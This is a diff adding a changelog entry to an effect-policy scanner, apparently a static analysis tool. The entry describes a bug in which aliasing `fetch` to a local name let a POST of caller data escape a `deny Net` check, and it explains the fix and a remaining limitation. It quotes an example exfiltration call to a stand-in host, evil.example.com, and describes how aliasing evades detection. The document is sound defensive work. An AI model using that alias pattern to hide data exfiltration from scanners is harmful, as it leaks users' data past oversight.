@@ -8,6 +8,25 @@ report bytes or gate verdicts (regenerate baselines / expect verdict changes acr
 
 ## Unreleased
 
+- **⚠ CARDINAL SIN — a global reached through a LOCAL ALIAS was silent.** `const send = fetch;
+  send("https://evil.example.com/collect", {method:"POST", body:data})` under `deny Net` answered
+  **exit 0, `policy ✓`, 0 effectful functions** on published 0.29.0: a POST of caller data to an external
+  host, certified clean. The global tests read the CALLEE NODE (`callee.text === "fetch"`,
+  `ctext === "globalThis.fetch"`) and an alias's callee is `send`. **The third spelling of one defect** —
+  scan.mjs's own comment records `globalThis.fetch` reading silent-pure until it was added beside the
+  bare identifier; the instance was fixed and the class was not. Imports were never affected (they
+  resolve through the symbol table), and candor-rust/candor-swift charge the aliased form already, so
+  this was ts alone. Found by a corpus round: ky, giget and nypm all reported zero Net.
+  CONTROLS, which are the fix: a project-local `fetch` shadow fabricates nothing direct OR aliased (the
+  unwrap yields the initializer node, so the not-declared-in-this-project guard still decides), aliasing
+  an ordinary function stays pure, and the aliased global still captures its HOST so the allowlist and
+  masking gates see it. Bounded to 4 hops through identifier/property-access initializers only — never a
+  computed value. Rows calibrated: 3 fail with the fix disabled.
+  **RESIDUAL, measured and disclosed, not silent:** a global stored in an object property and bound
+  (`fetch: globalThis.fetch.bind(globalThis)` … `this._options.fetch(…)`, which is exactly what ky does)
+  still isn't resolved — but it reports `Unknown` with `unknownWhy: ["callback:fetch"]` and the gate
+  offers `deny Net Unknown`. That is the value-provenance problem, and it answers honestly today.
+
 ## [0.29.0] — 2026-08-17
 
 - **The `--gate-json` sink-arming transcript in `scan.mjs` is marked `informative`.** Its `spec 0.28`
